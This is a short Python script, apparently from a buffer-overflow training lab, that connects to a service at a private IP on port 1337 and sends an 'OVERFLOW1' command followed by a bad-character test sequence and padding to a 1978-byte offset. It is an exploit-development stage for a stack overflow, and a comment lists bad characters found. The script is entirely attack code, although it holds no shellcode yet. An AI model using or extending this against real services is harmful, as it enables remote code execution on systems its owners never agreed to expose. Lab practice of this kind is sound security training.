import socket 
import struct

IP = "10.10.206.209"
PORT = 1337

s = socket.socket()
s.connect((IP,PORT))
s.recv(1024)

badchars = b"".join([(struct.pack("<B",x)) for x in range(1,256)]) #\x00\x07\x2e\xa0

prefix = b"OVERFLOW1 "
total_length = 3000
offset = 1978

buffer = [
    prefix,
    badchars,
    b"A" * offset,
    b"C" * (total_length - offset - len(prefix)-len(badchars))
]
buffer = b"".join(buffer)

s.send(buffer)
